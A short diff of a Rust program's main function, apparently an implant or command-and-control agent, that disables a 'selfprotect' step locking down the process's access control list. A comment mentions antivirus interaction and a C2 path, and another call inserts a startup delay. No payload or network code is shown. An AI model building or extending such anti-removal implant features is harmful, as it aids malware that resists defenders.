@@ -62,9 +62,9 @@ fn main() {
         config::busywork_intensity
     );
 
-    dlog!("main: selfprotect begin");
-    selfprotect::set_process_security_descriptor();
-    dlog!("main: selfprotect done");
+    // LAB: skip selfprotect — DACL lockdown can interact badly with AV / short-lived
+    // lab launches and obscures tasking failures. Re-enable after C2 path is solid.
+    dlog!("main: selfprotect skipped (lab)");
 
     helpers::startup_delay();
 
